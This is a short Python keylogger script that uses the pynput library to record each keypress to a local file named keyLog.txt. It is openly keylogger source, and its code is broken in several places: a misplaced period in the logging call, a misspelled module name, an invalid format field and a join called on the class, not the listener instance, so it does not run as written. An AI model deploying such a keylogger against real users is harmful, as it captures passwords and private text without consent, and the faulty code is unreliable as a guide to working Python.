from pynput.keyboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "keyLog.txt"). level=loggin.DEBUG, format='%(asctime)s: %(messages)s:')


def on_press(key):
    logging.info(str(key))
    # if key == Key.esc:
    # return false


with Listener(on_press=on_press) as listener:
    Listener.join()
